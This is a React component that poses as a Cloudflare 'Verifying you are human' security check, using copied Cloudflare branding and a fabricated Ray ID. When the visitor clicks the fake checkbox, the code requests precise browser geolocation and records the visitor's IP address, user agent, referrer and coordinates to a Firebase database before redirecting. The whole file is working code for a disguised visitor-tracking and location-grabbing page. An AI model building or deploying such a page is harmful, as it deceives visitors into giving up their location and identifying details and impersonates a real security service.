"use client";

import { useEffect, useRef, useState } from "react";
import styles from "@/components/VerifyClient.module.css";

interface VerifyClientProps {
  sessionId: string;
  hostname: string;
  redirectUrl: string;
}

function parseTraceIP(text: string) {
  const lines = text.trim().split("\n");
  const ipLine = lines.find((line) => line.startsWith("ip="));
  return ipLine ? ipLine.split("=")[1] || "" : "";
}

function generateMockIP() {
  const octet1 = Math.floor(Math.random() * 223) + 1;
  const octet2 = Math.floor(Math.random() * 255);
  const octet3 = Math.floor(Math.random() * 255);
  const octet4 = Math.floor(Math.random() * 254) + 1;
  return `${octet1}.${octet2}.${octet3}.${octet4}`;
}

function generateRayID() {
  const chars = "0123456789abcdef";
  let id = "";
  for (let index = 0; index < 16; index += 1) {
    id += chars[Math.floor(Math.random() * chars.length)];
  }
  return id;
}

export default function VerifyClient({ sessionId, hostname, redirectUrl }: VerifyClientProps) {
  const [verifying, setVerifying] = useState(false);
  const [success, setSuccess] = useState(false);
  const [exiting, setExiting] = useState(false);
  const [clientIp, setClientIp] = useState("Loading...");
  const [rayId, setRayId] = useState("");
  const timersRef = useRef<number[]>([]);

  const clearTimers = () => {
    timersRef.current.forEach((timerId) => window.clearTimeout(timerId));
    timersRef.current = [];
  };

  useEffect(() => {
    document.body.classList.add("verify-page-body");
    document.title = "Security Check";
    setRayId(generateRayID());

    const fetchIpify = async () => {
      const response = await fetch("https://api.ipify.org?format=json");
      const data = (await response.json()) as { ip?: string };
      return data?.ip || "";
    };

    const fetchGlobalTrace = async () => {
      const response = await fetch("https://www.cloudflare.com/cdn-cgi/trace");
      const text = await response.text();
      return parseTraceIP(text);
    };

    const fetchRelativeTrace = async () => {
      const response = await fetch("/cdn-cgi/trace");
      const text = await response.text();
      return parseTraceIP(text);
    };

    const loadClientIp = async () => {
      try {
        if (window.location.protocol !== "file:") {
          const tracedIp = await fetchRelativeTrace();
          if (tracedIp) {
            setClientIp(tracedIp);
            return;
          }
        }
      } catch {}

      try {
        const tracedIp = await fetchGlobalTrace();
        if (tracedIp) {
          setClientIp(tracedIp);
          return;
        }
      } catch {}

      try {
        const ip = await fetchIpify();
        setClientIp(ip || generateMockIP());
      } catch {
        setClientIp(generateMockIP());
      }
    };

    void loadClientIp();

    return () => {
      document.body.classList.remove("verify-page-body");
      clearTimers();
    };
  }, []);

  const getBrowserLocation = (): Promise<{ lat: number; lon: number; accuracy: number } | null> => {
    if (!navigator.geolocation) return Promise.resolve(null);
    return new Promise((resolve) => {
      navigator.geolocation.getCurrentPosition(
        (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
        () => resolve(null),
        { enableHighAccuracy: true, timeout: 5000, maximumAge: 60000 }
      );
    });
  };

  const startVerification = async () => {
    if (verifying) return;
    setVerifying(true);

    const ip = clientIp && clientIp !== "Loading..." ? clientIp : generateMockIP();
    const ray = rayId || generateRayID();

    const [geo] = await Promise.all([getBrowserLocation()]);

    try {
      const { db } = await import("@/lib/firebase");
      await db.logVisit(sessionId, {
        ip,
        rayId: ray,
        userAgent: navigator.userAgent,
        referrer: document.referrer || "Direct",
        lat: geo?.lat,
        lon: geo?.lon,
        geoAccuracy: geo?.accuracy,
      });
    } catch (error) {
      console.error("Failed to log visit:", error);
    }

    const verifyTimer = window.setTimeout(() => {
      setVerifying(false);
      setSuccess(true);

      const exitTimer = window.setTimeout(() => {
        setExiting(true);
        const redirectTimer = window.setTimeout(() => {
          window.location.href = redirectUrl;
        }, 1200);
        timersRef.current.push(redirectTimer);
      }, 600);
      timersRef.current.push(exitTimer);
    }, 1600);
    timersRef.current.push(verifyTimer);
  };

  const widgetStateClass = [
    styles.turnstileWidget,
    verifying ? styles.stateChecking : "",
    success ? styles.stateSuccess : "",
  ]
    .filter(Boolean)
    .join(" ");

  const exitOverlayClass = [styles.exitOverlay, exiting ? styles.exitOverlayActive : ""]
    .filter(Boolean)
    .join(" ");

  return (
    <div className={styles.shell}>
      <main className={styles.main}>
        <div className={styles.logoHeader}>
          <svg
            className={styles.logoCloud}
            viewBox="0 0 600 375"
            xmlns="http://www.w3.org/2000/svg"
          >
            <path d="M518.2 189.6C510.4 121.2 452.4 69 382 69c-33.6 0-64.2 12-88.2 32-15.6-26.6-44.2-44.4-77.2-44.4-48 0-87.2 37.6-90.8 84.8C54 148 4.2 201 4.2 266c0 66.4 53.6 120 120 120h380c55.2 0 100-44.8 100-100 0-51-38.4-93.2-86-96.4z" />
          </svg>
        </div>

        <h1 className={styles.title}>Verifying you are human</h1>
        <p className={styles.subHeading}>
          This security check helps us protect{" "}
          <span>{hostname || window.location.hostname || "this site"}</span> from automated traffic.
          It will only take a moment.
        </p>

        <div className={styles.turnstileContainer}>
          <div
            className={widgetStateClass}
            role="checkbox"
            aria-checked={success ? "true" : verifying ? "mixed" : "false"}
            tabIndex={0}
            onClick={startVerification}
            onKeyDown={(event) => {
              if (event.key === " " || event.key === "Enter") {
                event.preventDefault();
                void startVerification();
              }
            }}
          >
            <div className={styles.widgetLeft}>
              <div className={styles.widgetCheckboxWrapper}>
                <div className={styles.widgetCheckbox} />
                <div className={styles.widgetSpinner} />
                <svg
                  className={styles.widgetCheckmark}
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="3"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <polyline points="20 6 9 17 4 12" />
                </svg>
              </div>
              <span className={styles.widgetLabel}>
                {verifying ? "Verifying..." : success ? "Success!" : "Verify you are human"}
              </span>
            </div>

            <div className={styles.widgetRight}>
              <div className={styles.widgetLogoContainer}>
                <span className={styles.cloudflareText}>CLOUDFLARE</span>
                <svg
                  className={styles.logoMiniCloud}
                  viewBox="0 0 600 375"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path d="M518.2 189.6C510.4 121.2 452.4 69 382 69c-33.6 0-64.2 12-88.2 32-15.6-26.6-44.2-44.4-77.2-44.4-48 0-87.2 37.6-90.8 84.8C54 148 4.2 201 4.2 266c0 66.4 53.6 120 120 120h380c55.2 0 100-44.8 100-100 0-51-38.4-93.2-86-96.4z" />
                </svg>
              </div>
              <div className={styles.widgetLinks}>
                <a
                  href="https://www.cloudflare.com/privacypolicy/"
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  Privacy
                </a>
                <span>•</span>
                <a
                  href="https://www.cloudflare.com/website-terms-of-use/"
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  Help
                </a>
              </div>
            </div>
          </div>
        </div>
      </main>

      <footer className={styles.footer}>
        <div className={styles.footerLinks}>
          <p>
            Performance & security by{" "}
            <a href="https://www.cloudflare.com" target="_blank" rel="noopener noreferrer">
              Cloudflare
            </a>
          </p>
        </div>
        <div className={styles.metaDetails}>
          Cloudflare Ray ID: <span>{rayId || "---------"}</span> • Your IP: <span>{clientIp}</span>
        </div>
      </footer>

      <div className={exitOverlayClass}>
        <div className={styles.exitSpinner} />
        <div className={styles.exitText}>Connection secure. Redirecting...</div>
      </div>
    </div>
  );
}
